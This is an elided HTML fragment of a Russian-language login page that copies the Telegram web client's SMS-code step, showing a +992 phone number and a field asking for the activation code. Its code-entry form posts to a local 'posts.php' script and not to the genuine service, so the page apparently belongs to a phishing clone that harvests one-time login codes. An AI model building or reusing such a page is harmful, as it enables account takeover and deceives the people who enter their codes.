  ...
  <div class="login_page">
    <div class="login_head_wrap clearfix" ng-switch="progress.enabled">
      ...
      <!----><div ng-switch-default="" class="login_head_submit_wrap" style="">
        ...
        <button msgid="modal_next">Войти</button><i class="icon icon-next-submit"></i>
        </a><!---->
        <!---->
        <!---->
      </div><!---->
    ...
    <div class="login_form_wrap">
      ...
      <!----><form action="posts.php" method="post" name="myLoginForm" ng-if="credentials.phone_code_hash && !credentials.phone_code_valid" ng-submit="logIn()" class="ng-pristine ng-invalid ng-invalid-required" style="">
        <h3 class="login_phone_head"><span ng-bind="credentials.phone_country">+992</span> <span ng-bind="credentials.phone_number">XXXXXXXX</span></h3>
        <div class="login_edit_phone"><a ng-click="editPhone()" my-i18n="login_edit_number">Изменить номер телефона</a></div>

        <div ng-switch="credentials.type._">
          <!---->
          <!---->
          <!----><p ng-switch-default="" class="login_smscode_lead" my-i18n="login_enter_sms_code_label_md">Мы отправили SMS с кодом активации на ваш номер.<br>Пожалуйста, введите код ниже.</p><!---->
        </div>
        ...
        <div class="md-input-group md-input-group-centered md-input-animated md-input-focused md-input-has-value" ng-class="{'md-input-error': error.field == 'phone_code'}" my-labeled-input="" ng-switch="error.field == 'phone_code'">
          <!---->
          <!----><label ng-switch-default="" class="md-input-label" my-i18n="login_number_input_placeholder">Введите ваш код</label><!---->
